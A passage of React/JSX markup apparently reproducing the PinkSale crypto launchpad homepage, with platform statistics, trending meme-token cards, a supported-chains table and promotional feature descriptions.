                                    <div class="text-4xl leading-relaxed uppercase text-brand">3.4M</div>
                                    <div class="text-xs">Total Participants</div>
                                  </div>
                                  <div class="transition-all flex-1 flex flex-col items-center">
                                    <div class="text-4xl leading-relaxed uppercase text-brand">$304.3M</div>
                                    <div class="text-xs">Total Values Locked</div>
                                  </div>
                                </div>
                              </div>
                              <div class="text-xs py-2 px-4 border-t border-dashed dark:border-neutral-300 flex items-center gap-2"><div>
                              <Image alt="PinkSale" loading="lazy" width="16" height="16" decoding="async" data-nimg="1" style={{color:"transparent"}} src={pinksale} /></div>
                              <div class="flex-1"><a href="https://www.coingecko.com/en/coins/pinksale" class="underline hover:text-brand" target="_blank" rel="nofollow noreferrer">PINKSALE</a></div>
                              <div class="text-brand">
                                <a href="https://www.coingecko.com/en/coins/pinksale" target="_blank" rel="nofollow noreferrer">$259.35</a>
                              </div>
                            </div>
                          </div>
                         </div>
                      </div>
                  </div>

                  <div class="mx-auto pt-20">
                    <div class="shadow-sm dark:shadow-lg text-sm dark:text-brand-text-dark rounded-md bg-white dark:bg-brand-dark">
                        <div class="overflow-x-auto">
                            <div class="overflow-x-auto w-fit whitespace-nowrap -mx-2 divide-x divide-dashed dark:divide-neutral-300">

                              <a class="text-center p-4 rounded-sm text-sm inline-block w-[120px] whitespace-normal group relative overflow-hidden -mb-1" href="/solana/launchpad/5Kqug3eE9qnHVoh3EecZmdZsHbCTM7CsnbkDye7vUV3C">
                                <figure class="inline-block relative transition-all duration-200 group-hover:scale-125 group-hover:-translate-y-2">
                                  <Image src={baby} width={316} height={316} alt="" class="rounded-full p-[1px] border border-brand-lighter dark:border-brand-darker object-cover w-[48px] h-[48px]" loading="lazy" />
                                  <Image alt="Solana" loading="lazy" width="316" height="316" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6 absolute -right-1 -bottom-1" src={solana} style={{color : "transparent"}} />
                                </figure><div class="line-clamp-1 w-full text-xs font-medium mt-3 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2 group-hover:text-brand">Baby</div><div class="text-xs text-gray-400 dark:text-neutral-400 line-clamp-1 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2">BABY</div>
                                <div class="absolute z-[2] transition-all duration-200 rotate-45 bg-emerald-200 dark:bg-emerald-600 text-emerald-800 dark:text-black text-[10px] leading-[12px] w-[100px] py-[2px] top-[8px] group-hover:top-[4px] -right-[32px] group-hover:-right-[40px] text-center font-semibold">x346</div>
                              </a>

                              <a class="text-center p-4 rounded-sm text-sm inline-block w-[120px] whitespace-normal group relative overflow-hidden -mb-1" href="/solana/launchpad/5Kqug3eE9qnHVoh3EecZmdZsHbCTM7CsnbkDye7vUV3C">
                                <figure class="inline-block relative transition-all duration-200 group-hover:scale-125 group-hover:-translate-y-2">
                                  <Image src={catwifihat} width={316} height={316} alt="" class="rounded-full p-[1px] border border-brand-lighter dark:border-brand-darker object-cover w-[48px] h-[48px]" loading="lazy" />
                                  <Image alt="Solana" loading="lazy" width="316" height="316" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6 absolute -right-1 -bottom-1" src={solana} style={{color : "transparent"}} />
                                </figure><div class="line-clamp-1 w-full text-xs font-medium mt-3 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2 group-hover:text-brand">CatWifiHat</div><div class="text-xs text-gray-400 dark:text-neutral-400 line-clamp-1 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2">CatWifiHat</div>
                                <div class="absolute z-[2] transition-all duration-200 rotate-45 bg-emerald-200 dark:bg-emerald-600 text-emerald-800 dark:text-black text-[10px] leading-[12px] w-[100px] py-[2px] top-[8px] group-hover:top-[4px] -right-[32px] group-hover:-right-[40px] text-center font-semibold">x225</div>
                              </a>

                              <a class="text-center p-4 rounded-sm text-sm inline-block w-[120px] whitespace-normal group relative overflow-hidden -mb-1" href="/solana/launchpad/5Kqug3eE9qnHVoh3EecZmdZsHbCTM7CsnbkDye7vUV3C">
                                <figure class="inline-block relative transition-all duration-200 group-hover:scale-125 group-hover:-translate-y-2">
                                  <Image src={babytrump} width={316} height={316} alt="" class="rounded-full p-[1px] border border-brand-lighter dark:border-brand-darker object-cover w-[48px] h-[48px]" loading="lazy" />
                                  <Image alt="BNB Smart Chain" loading="lazy" width="316" height="316" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6 absolute -right-1 -bottom-1" src={bnb} style={{color : "transparent"}} />
                                </figure><div class="line-clamp-1 w-full text-xs font-medium mt-3 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2 group-hover:text-brand">Baby Trump</div><div class="text-xs text-gray-400 dark:text-neutral-400 line-clamp-1 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2">AXGT</div>
                                <div class="absolute z-[2] transition-all duration-200 rotate-45 bg-emerald-200 dark:bg-emerald-600 text-emerald-800 dark:text-black text-[10px] leading-[12px] w-[100px] py-[2px] top-[8px] group-hover:top-[4px] -right-[32px] group-hover:-right-[40px] text-center font-semibold">x205</div>
                              </a>

                              <a class="text-center p-4 rounded-sm text-sm inline-block w-[120px] whitespace-normal group relative overflow-hidden -mb-1" href="/solana/launchpad/5Kqug3eE9qnHVoh3EecZmdZsHbCTM7CsnbkDye7vUV3C">
                                <figure class="inline-block relative transition-all duration-200 group-hover:scale-125 group-hover:-translate-y-2">
                                  <Image src={imgur} width={316} height={316} alt="" class="rounded-full p-[1px] border border-brand-lighter dark:border-brand-darker object-cover w-[48px] h-[48px]" loading="lazy" />
                                  <Image alt="Ethereum Mainnet" loading="lazy" width="316" height="316" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6 absolute -right-1 -bottom-1" src={eth} style={{color : "transparent"}} />
                                </figure><div class="line-clamp-1 w-full text-xs font-medium mt-3 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2 group-hover:text-brand">AxonDAO..</div><div class="text-xs text-gray-400 dark:text-neutral-400 line-clamp-1 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2">BabyTrump</div>
                                <div class="absolute z-[2] transition-all duration-200 rotate-45 bg-emerald-200 dark:bg-emerald-600 text-emerald-800 dark:text-black text-[10px] leading-[12px] w-[100px] py-[2px] top-[8px] group-hover:top-[4px] -right-[32px] group-hover:-right-[40px] text-center font-semibold">x184</div>
                              </a>

                              <a class="text-center p-4 rounded-sm text-sm inline-block w-[120px] whitespace-normal group relative overflow-hidden -mb-1" href="/solana/launchpad/5Kqug3eE9qnHVoh3EecZmdZsHbCTM7CsnbkDye7vUV3C">
                                <figure class="inline-block relative transition-all duration-200 group-hover:scale-125 group-hover:-translate-y-2">
                                  <Image src={grokcat} width={316} height={316} alt="" class="rounded-full p-[1px] border border-brand-lighter dark:border-brand-darker object-cover w-[48px] h-[48px]" loading="lazy" />
                                  <Image alt="BNB Smart Chain" loading="lazy" width="316" height="316" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6 absolute -right-1 -bottom-1" src={eth} style={{color : "transparent"}} />
                                </figure><div class="line-clamp-1 w-full text-xs font-medium mt-3 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2 group-hover:text-brand">Grok Cat</div><div class="text-xs text-gray-400 dark:text-neutral-400 line-clamp-1 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2">GrokCat</div>
                                <div class="absolute z-[2] transition-all duration-200 rotate-45 bg-emerald-200 dark:bg-emerald-600 text-emerald-800 dark:text-black text-[10px] leading-[12px] w-[100px] py-[2px] top-[8px] group-hover:top-[4px] -right-[32px] group-hover:-right-[40px] text-center font-semibold">x83</div>
                              </a>

                              <a class="text-center p-4 rounded-sm text-sm inline-block w-[120px] whitespace-normal group relative overflow-hidden -mb-1" href="/solana/launchpad/5Kqug3eE9qnHVoh3EecZmdZsHbCTM7CsnbkDye7vUV3C">
                                <figure class="inline-block relative transition-all duration-200 group-hover:scale-125 group-hover:-translate-y-2">
                                  <Image src={nobleblocks} width={316} height={316} alt="" class="rounded-full p-[1px] border border-brand-lighter dark:border-brand-darker object-cover w-[48px] h-[48px]" loading="lazy" />
                                  <Image alt="BNB Smart Chain" loading="lazy" width="316" height="316" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6 absolute -right-1 -bottom-1" src={eth} style={{color : "transparent"}} />
                                </figure><div class="line-clamp-1 w-full text-xs font-medium mt-3 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2 group-hover:text-brand">NOBLEBLOC...</div><div class="text-xs text-gray-400 dark:text-neutral-400 line-clamp-1 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2">NOBL</div>
                                <div class="absolute z-[2] transition-all duration-200 rotate-45 bg-emerald-200 dark:bg-emerald-600 text-emerald-800 dark:text-black text-[10px] leading-[12px] w-[100px] py-[2px] top-[8px] group-hover:top-[4px] -right-[32px] group-hover:-right-[40px] text-center font-semibold">x36</div>
                              </a>

                              <a class="text-center p-4 rounded-sm text-sm inline-block w-[120px] whitespace-normal group relative overflow-hidden -mb-1" href="/solana/launchpad/5Kqug3eE9qnHVoh3EecZmdZsHbCTM7CsnbkDye7vUV3C">
                                <figure class="inline-block relative transition-all duration-200 group-hover:scale-125 group-hover:-translate-y-2">
                                  <Image src={dogemob} width={316} height={316} alt="" class="rounded-full p-[1px] border border-brand-lighter dark:border-brand-darker object-cover w-[48px] h-[48px]" loading="lazy" />
                                  <Image alt="BNB Smart Chain" loading="lazy" width="316" height="316" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6 absolute -right-1 -bottom-1" src={bnb} style={{color : "transparent"}} />
                                </figure><div class="line-clamp-1 w-full text-xs font-medium mt-3 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2 group-hover:text-brand">DOGEMOB</div><div class="text-xs text-gray-400 dark:text-neutral-400 line-clamp-1 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2">NOBL</div>
                                <div class="absolute z-[2] transition-all duration-200 rotate-45 bg-emerald-200 dark:bg-emerald-600 text-emerald-800 dark:text-black text-[10px] leading-[12px] w-[100px] py-[2px] top-[8px] group-hover:top-[4px] -right-[32px] group-hover:-right-[40px] text-center font-semibold">x32</div>
                              </a>

                              <a class="text-center p-4 rounded-sm text-sm inline-block w-[120px] whitespace-normal group relative overflow-hidden -mb-1" href="/solana/launchpad/5Kqug3eE9qnHVoh3EecZmdZsHbCTM7CsnbkDye7vUV3C">
                                <figure class="inline-block relative transition-all duration-200 group-hover:scale-125 group-hover:-translate-y-2">
                                  <Image src={tokuda} width={316} height={316} alt="" class="rounded-full p-[1px] border border-brand-lighter dark:border-brand-darker object-cover w-[48px] h-[48px]" loading="lazy" />
                                  <Image alt="BNB Smart Chain" loading="lazy" width="316" height="316" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6 absolute -right-1 -bottom-1" src={bnb} style={{color : "transparent"}} />
                                </figure><div class="line-clamp-1 w-full text-xs font-medium mt-3 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2 group-hover:text-brand">TOKUDA</div><div class="text-xs text-gray-400 dark:text-neutral-400 line-clamp-1 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2">TKD</div>
                                <div class="absolute z-[2] transition-all duration-200 rotate-45 bg-emerald-200 dark:bg-emerald-600 text-emerald-800 dark:text-black text-[10px] leading-[12px] w-[100px] py-[2px] top-[8px] group-hover:top-[4px] -right-[32px] group-hover:-right-[40px] text-center font-semibold">x32</div>
                              </a>

                              <a class="text-center p-4 rounded-sm text-sm inline-block w-[120px] whitespace-normal group relative overflow-hidden -mb-1" href="/solana/launchpad/5Kqug3eE9qnHVoh3EecZmdZsHbCTM7CsnbkDye7vUV3C">
                                <figure class="inline-block relative transition-all duration-200 group-hover:scale-125 group-hover:-translate-y-2">
                                  <Image src={falconx} width={316} height={316} alt="" class="rounded-full p-[1px] border border-brand-lighter dark:border-brand-darker object-cover w-[48px] h-[48px]" loading="lazy" />
                                  <Image alt="Solana" loading="lazy" width="316" height="316" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6 absolute -right-1 -bottom-1" src={solana} style={{color : "transparent"}} />
                                </figure><div class="line-clamp-1 w-full text-xs font-medium mt-3 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2 group-hover:text-brand">FalconX</div><div class="text-xs text-gray-400 dark:text-neutral-400 line-clamp-1 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2">FALX</div>
                                <div class="absolute z-[2] transition-all duration-200 rotate-45 bg-emerald-200 dark:bg-emerald-600 text-emerald-800 dark:text-black text-[10px] leading-[12px] w-[100px] py-[2px] top-[8px] group-hover:top-[4px] -right-[32px] group-hover:-right-[40px] text-center font-semibold">x29</div>
                              </a>

                              <a class="text-center p-4 rounded-sm text-sm inline-block w-[120px] whitespace-normal group relative overflow-hidden -mb-1" href="/solana/launchpad/5Kqug3eE9qnHVoh3EecZmdZsHbCTM7CsnbkDye7vUV3C">
                                <figure class="inline-block relative transition-all duration-200 group-hover:scale-125 group-hover:-translate-y-2">
                                  <Image src={eagleai} width={316} height={316} alt="" class="rounded-full p-[1px] border border-brand-lighter dark:border-brand-darker object-cover w-[48px] h-[48px]" loading="lazy" />
                                  <Image alt="Base Mainnet" loading="lazy" width="316" height="316" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6 absolute -right-1 -bottom-1" src={base} style={{color : "transparent"}} />
                                </figure><div class="line-clamp-1 w-full text-xs font-medium mt-3 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2 group-hover:text-brand">Eagle AI</div><div class="text-xs text-gray-400 dark:text-neutral-400 line-clamp-1 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2">EAI</div>
                                <div class="absolute z-[2] transition-all duration-200 rotate-45 bg-emerald-200 dark:bg-emerald-600 text-emerald-800 dark:text-black text-[10px] leading-[12px] w-[100px] py-[2px] top-[8px] group-hover:top-[4px] -right-[32px] group-hover:-right-[40px] text-center font-semibold">x5</div>
                              </a>

                              <a class="text-center p-4 rounded-sm text-sm inline-block w-[120px] whitespace-normal group relative overflow-hidden -mb-1" href="/solana/launchpad/5Kqug3eE9qnHVoh3EecZmdZsHbCTM7CsnbkDye7vUV3C">
                                <figure class="inline-block relative transition-all duration-200 group-hover:scale-125 group-hover:-translate-y-2">
                                  <Image src={horusx} width={316} height={316} alt="" class="rounded-full p-[1px] border border-brand-lighter dark:border-brand-darker object-cover w-[48px] h-[48px]" loading="lazy" />
                                  <Image alt="BNB Smart Chain" loading="lazy" width="316" height="316" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6 absolute -right-1 -bottom-1" src={bnb} style={{color : "transparent"}} />
                                </figure><div class="line-clamp-1 w-full text-xs font-medium mt-3 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2 group-hover:text-brand">HorusX</div><div class="text-xs text-gray-400 dark:text-neutral-400 line-clamp-1 transition-all duration-200 group-hover:scale-105 group-hover:-translate-y-2">HRX</div>
                                <div class="absolute z-[2] transition-all duration-200 rotate-45 bg-emerald-200 dark:bg-emerald-600 text-emerald-800 dark:text-black text-[10px] leading-[12px] w-[100px] py-[2px] top-[8px] group-hover:top-[4px] -right-[32px] group-hover:-right-[40px] text-center font-semibold">x5</div>
                              </a>


                            </div>
                        </div>
                    </div>
                  </div>

                  <div class="mt-20">
                      <div class="rounded-md shadow-sm dark:shadow-lg dark:text-brand-text-dark bg-white dark:bg-brand-dark">
                        <div class="flex items-center border-b border-dashed dark:border-neutral-800 p-4">
                          <h2 class="capitalize font-semibold leading-relaxed text-md flex-1">Supported chains</h2>
                        </div>

                        <div class="text-sm p-4">
                          <table width="100%" class="border-spacing-1" >
                          <thead class="text-left font-medium border-b border-dashed dark:border-neutral-800">
                            <tr>
                              <th class="font-medium px-1">Chain</th>
                              <th class="font-medium px-1">Projects</th>
                              <th class="font-medium px-1">Participants</th>
                              <th class="font-medium px-1">Liquidity raised</th>
                              <th class="font-medium px-1">Values Locked</th>
                            </tr>
                          </thead>
                          <tbody class="divide-y divide-dashed dark:divide-neutral-300">

                            <tr>
                              <td class="py-2 px-1">
                              <Image alt="BNB Smart Chain" loading="lazy" width="316" height="316" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6 " src={bnb} style={{color : "transparent"}} />
                              </td>
                              <td class="py-2 px-1">23.2K</td>
                              <td class="py-2 px-1">2.8M</td>
                              <td class="py-2 px-1">$970.8M</td>
                              <td class="py-2 px-1">$189.2M</td>
                            </tr>

                            <tr>
                              <td class="py-2 px-1">
                                <Image alt="Ethereum Mainnet" loading="lazy" width="32" height="32" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6" style={{color:"transparent"}} src={eth} />
                              </td>
                              <td class="py-2 px-1">2.9K</td>
                              <td class="py-2 px-1">158.8K</td>
                              <td class="py-2 px-1">$152.4M</td>
                              <td class="py-2 px-1">$52.7M</td>
                            </tr>

                            <tr>
                              <td class="py-2 px-1">
                                <Image alt="Solana" loading="lazy" width="316" height="316" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6" style={{color:"transparent"}} src={solana} />
                              </td>
                              <td class="py-2 px-1">2.2K</td>
                              <td class="py-2 px-1">390.7K</td>
                              <td class="py-2 px-1">-</td>
                              <td class="py-2 px-1">$24.7M</td>
                            </tr>

                            <tr>
                              <td class="py-2 px-1">
                                <Image alt="Arbitrum" loading="lazy" width="316" height="316" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6" style={{color:"transparent"}} src={arbitrum} />
                              </td>
                              <td class="py-2 px-1">276</td>
                              <td class="py-2 px-1">18.2K</td>
                              <td class="py-2 px-1">$10.9M</td>
                              <td class="py-2 px-1">$1.5M</td>
                            </tr>

                            <tr>
                              <td class="py-2 px-1">
                                <Image alt="Polygon Mainnet" loading="lazy" width="406" height="406" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6" style={{color:"transparent"}} src={polygon} />
                              </td>
                              <td class="py-2 px-1">367</td>
                              <td class="py-2 px-1">3.3K</td>
                              <td class="py-2 px-1">$525K</td>
                              <td class="py-2 px-1">$322.1K</td>
                            </tr>

                            <tr>
                              <td class="py-2 px-1">
                                <Image alt="Avalanche C-Chain" loading="lazy" width="254" height="254" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6" style={{color:"transparent"}} src={avax} />
                              </td>
                              <td class="py-2 px-1">120</td>
                              <td class="py-2 px-1">7.4K</td>
                              <td class="py-2 px-1">-</td>
                              <td class="py-2 px-1">$0</td>
                            </tr>

                            <tr>
                              <td class="py-2 px-1"><Image alt="Fantom Opera" loading="lazy" width="56" height="71" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6" style={{color:"transparent"}} src={fantom} /></td>
                              <td class="py-2 px-1">39</td>
                              <td class="py-2 px-1">518</td>
                              <td class="py-2 px-1">-</td>
                              <td class="py-2 px-1">-</td>
                            </tr>

                            <tr>
                              <td class="py-2 px-1"><Image alt="Cronos Mainnet" loading="lazy" width="56" height="71" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6" style={{color:"transparent"}} src={cronos} /></td>
                              <td class="py-2 px-1">-</td>
                              <td class="py-2 px-1">-</td>
                              <td class="py-2 px-1">-</td>
                              <td class="py-2 px-1">-</td>
                            </tr>

                            <tr>
                              <td class="py-2 px-1"><Image alt="Bitrock" loading="lazy" width="56" height="71" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6" style={{color:"transparent"}} src={bitrock} /></td>
                              <td class="py-2 px-1">2</td>
                              <td class="py-2 px-1">4</td>
                              <td class="py-2 px-1">-</td>
                              <td class="py-2 px-1">-</td>
                            </tr>

                            <tr>
                              <td class="py-2 px-1"><Image alt="Core" loading="lazy" width="56" height="71" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6" style={{color:"transparent"}} src={core} /></td>
                              <td class="py-2 px-1">2</td>
                              <td class="py-2 px-1">158</td>
                              <td class="py-2 px-1">-</td>
                              <td class="py-2 px-1">-</td>
                            </tr>

                            <tr>
                              <td class="py-2 px-1"><Image alt="Dogechain" loading="lazy" width="56" height="71" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6" style={{color:"transparent"}} src={dogechain} /></td>
                              <td class="py-2 px-1">29</td>
                              <td class="py-2 px-1">301</td>
                              <td class="py-2 px-1">-</td>
                              <td class="py-2 px-1">-</td>
                            </tr>

                            <tr>
                              <td class="py-2 px-1"><Image alt="Pulse Chain" loading="lazy" width="56" height="71" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6" style={{color:"transparent"}} src={pulse} /></td>
                              <td class="py-2 px-1">10</td>
                              <td class="py-2 px-1">304</td>
                              <td class="py-2 px-1">$11.6K</td>
                              <td class="py-2 px-1">$541</td>
                            </tr>

                            <tr>
                              <td class="py-2 px-1"><Image alt="Base Mainnet" loading="lazy" width="56" height="71" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6" style={{color:"transparent"}} src={base} /></td>
                              <td class="py-2 px-1">117</td>
                              <td class="py-2 px-1">6.9K</td>
                              <td class="py-2 px-1">$2M</td>
                              <td class="py-2 px-1">$2M</td>
                            </tr>

                          </tbody>
                          </table>

                        </div>

                      </div>
                  </div>

                  <section class="mt-32 text-center mb-12 p-5">
                    <h2 class="leading-relaxed text-2xl font-semibold mb-4">A Suite of Tools for Token Sales</h2>
                    <p class="leading-relaxed">A suite of tools were built to help you create your own tokens and launchpads in a fast,<br /> simple and cheap way, with no prior code knowledge required and 100% decentralized!</p>

                    <div class="grid grid-cols-1 gap-6 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 mt-12">
                      <div class="transition-all bg-white dark:bg-brand-dark p-6 rounded-lg shadow-sm hover:shadow-sm">
                        <div class="w-[64px] mx-auto mb-6">
                          <Image alt="PinkSale" loading="lazy" width="64" height="64" decoding="async" data-nimg="1" style={{color:"transparent"}} src={pinksale} /></div>
                          <h3 class="font-medium text-lg leading-relaxed">Standard</h3>
                          <p class="text-sm text-gray-400 dark:text-brand-text-dark">Mint standard tokens on ETH, BSC, AVAX, Fantom, Polygon.</p>
                        </div>
                        <div class="transition-all bg-white dark:bg-brand-dark p-6 rounded-lg shadow-sm hover:shadow-sm">
                          <div class="w-[64px] mx-auto mb-6">
                            <Image alt="PinkSale" loading="lazy" width="64" height="64" decoding="async" data-nimg="1" style={{color:"transparent"}} src={pinksale} /></div>
                            <h3 class="font-medium text-lg leading-relaxed">Deflationary</h3>
                            <p class="text-sm text-gray-400 dark:text-brand-text-dark">Generate deflationary tokens with tax and/or charity functions.</p>
                          </div>
                          <div class="transition-all bg-white dark:bg-brand-dark p-6 rounded-lg shadow-sm hover:shadow-sm">
                            <div class="w-[64px] mx-auto mb-6">
                              <Image alt="PinkSale" loading="lazy" width="64" height="64" decoding="async" data-nimg="1" style={{color:"transparent"}} src={pinksale} /></div>
                              <h3 class="font-medium text-lg leading-relaxed">Customization</h3>
                              <p class="text-sm text-gray-400 dark:text-brand-text-dark">Create a token sale for your own custom token easily.</p>
                            </div>
                            <div class="transition-all bg-white dark:bg-brand-dark p-6 rounded-lg shadow-sm hover:shadow-sm">
                              <div class="w-[64px] mx-auto mb-6">
                                <Image alt="PinkSale" loading="lazy" width="64" height="64" decoding="async" data-nimg="1" style={{color:"transparent"}} src={pinksale} />
                              </div>
                              <h3 class="font-medium text-lg leading-relaxed">Launchpad</h3>
                              <p class="text-sm text-gray-400 dark:text-brand-text-dark">Use the token you mint to create a launchpad with just a few clicks</p>
                            </div>
                            <div class="transition-all bg-white dark:bg-brand-dark p-6 rounded-lg shadow-sm hover:shadow-sm">
                              <div class="w-[64px] mx-auto mb-6">
                                <Image alt="PinkSale" loading="lazy" width="64" height="64" decoding="async" data-nimg="1" style={{color:"transparent"}} src={pinksale} />
                              </div>
                              <h3 class="font-medium text-lg leading-relaxed">Branding</h3>
                              <p class="text-sm text-gray-400 dark:text-brand-text-dark">Adding logo, social links, description, listing on PinkSale.</p>
                            </div>
                            <div class="transition-all bg-white dark:bg-brand-dark p-6 rounded-lg shadow-sm hover:shadow-sm">
                              <div class="w-[64px] mx-auto mb-6">
                                <Image alt="PinkSale" loading="lazy" width="64" height="64" decoding="async" data-nimg="1" style={{color:"transparent"}} src={pinksale} />
                              </div>
                              <h3 class="font-medium text-lg leading-relaxed">Management</h3>
                              <p class="text-sm text-gray-400 dark:text-brand-text-dark">The portal to help you easily update content for your launchpad.</p>
                            </div>
                            <div class="transition-all bg-white dark:bg-brand-dark p-6 rounded-lg shadow-sm hover:shadow-sm">
                              <div class="w-[64px] mx-auto mb-6">
                                <Image alt="PinkSale" loading="lazy" width="64" height="64" decoding="async" data-nimg="1" style={{color:"transparent"}} src={pinksale} />
                              </div>
                              <h3 class="font-medium text-lg leading-relaxed">Community</h3>
                              <p class="text-sm text-gray-400 dark:text-brand-text-dark">Promote your launchpad to millions of buyers on PinkSale.</p>
                            </div>
                            <div class="transition-all bg-white dark:bg-brand-dark p-6 rounded-lg shadow-sm hover:shadow-sm">
                              <div class="w-[64px] mx-auto mb-6">
                                <Image alt="PinkSale" loading="lazy" width="64" height="64" decoding="async" data-nimg="1" style={{color:"transparent"}} src={pinksale} />
                              </div>
                              <h3 class="font-medium text-lg leading-relaxed">Locking</h3>
                              <p class="text-sm text-gray-400 dark:text-brand-text-dark">Lock your liquidity to PinkSwap, PancakeSwap after presale.</p>
                            </div>
                          </div>
                  </section>

                  <section class="mt-32 text-center mb-12 p-5">
                  <h2 class="leading-relaxed text-2xl font-semibold mb-4">A Growing Protocol Ecosystem</h2>
                  <p class="leading-relaxed">We build a suite of tools for the world of decentralized finance. PinkMoon, PinkSale, PinkElon PinkLock, PinkSwap, we Pink everything!</p>
                  <div class="grid grid-cols-1 gap-6 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 mt-12">
                    <div class="transition-all bg-white dark:bg-brand-dark p-6 rounded-lg shadow-sm hover:shadow-sm">
                      <div class="w-[64px] mx-auto mb-6">
                        <Image alt="PinkSale" loading="lazy" width="64" height="64" decoding="async" data-nimg="1" style={{color:"transparent"}} src={pinksale} />
                      </div>
                      <h3 class="font-medium text-lg leading-relaxed">PinkMoon</h3>
                      <p class="text-sm text-gray-400 dark:text-brand-text-dark">The best launchpad for professional teams</p>
                    </div>
                    <div class="transition-all bg-white dark:bg-brand-dark p-6 rounded-lg shadow-sm hover:shadow-sm">
                      <div class="w-[64px] mx-auto mb-6">
                        <Image alt="PinkSale" loading="lazy" width="64" height="64" decoding="async" data-nimg="1" style={{color:"transparent"}} src={pinksale} />
                      </div>
                      <h3 class="font-medium text-lg leading-relaxed">PinkSale</h3>
                      <p class="text-sm text-gray-400 dark:text-brand-text-dark">Launch a token sale with a few clicks.</p>
                    </div>
                    <div class="transition-all bg-white dark:bg-brand-dark p-6 rounded-lg shadow-sm hover:shadow-sm">
                      <div class="w-[64px] mx-auto mb-6">
                        <Image alt="PinkSale" loading="lazy" width="64" height="64" decoding="async" data-nimg="1" style={{color:"transparent"}} src={pinksale} />
                      </div>
                      <h3 class="font-medium text-lg leading-relaxed">PinkSwap</h3>
                      <p class="text-sm text-gray-400 dark:text-brand-text-dark">Swap tokens and farming $PinkS.</p>
                    </div>
                    <div class="transition-all bg-white dark:bg-brand-dark p-6 rounded-lg shadow-sm hover:shadow-sm">
                      <div class="w-[64px] mx-auto mb-6">
                        <Image alt="PinkSale" loading="lazy" width="64" height="64" decoding="async" data-nimg="1" style={{color:"transparent"}} src={pinksale} />
                      </div>
                      <h3 class="font-medium text-lg leading-relaxed">PinkLock</h3>
                      <p class="text-sm text-gray-400 dark:text-brand-text-dark">Locking liquidity on PinkSwap.</p>
                    </div>
                    <div class="transition-all bg-white dark:bg-brand-dark p-6 rounded-lg shadow-sm hover:shadow-sm">
                      <div class="w-[64px] mx-auto mb-6">
                        <Image alt="PinkSale" loading="lazy" width="64" height="64" decoding="async" data-nimg="1" style={{color:"transparent"}} src={pinksale} />
                      </div>
                      <h3 class="font-medium text-lg leading-relaxed">PinkElon</h3>
                      <p class="text-sm text-gray-400 dark:text-brand-text-dark">The first meme token on PinkMoon.</p>
                    </div>
                    <div class="transition-all bg-white dark:bg-brand-dark p-6 rounded-lg shadow-sm hover:shadow-sm">
                      <div class="w-[64px] mx-auto mb-6">
                        <Image alt="PinkSale" loading="lazy" width="64" height="64" decoding="async" data-nimg="1" style={{color:"transparent"}} src={pinksale} />
                      </div>
                      <h3 class="font-medium text-lg leading-relaxed">PinkWallet</h3>
                      <p class="text-sm text-gray-400 dark:text-brand-text-dark">Crypto wallet, buy, store, exchange &amp; earn.</p>
                    </div>
                  </div>
                  </section>


              </div>
          </div>
       </main>

       <footer class="bg-white dark:bg-brand-dark text-center text-sm border-t dark:border-neutral-800">
          <div class="mx-auto my-4 sm:my-6 md:my-12 container">
          <div class="p-5">Disclaimer: PinkSale will never endorse or encourage that you invest in any of the projects listed and therefore, accept no liability for any loss occasioned. It is the user(s) responsibility to do their own research and seek financial advice from a professional. More information about (DYOR) can be found via
            <a href="https://academy.binance.com/en/glossary/do-your-own-research" class="text-brand-500 hover:underline text-[#f95192]" target="_blank"> Binance Academy</a>.
          </div>
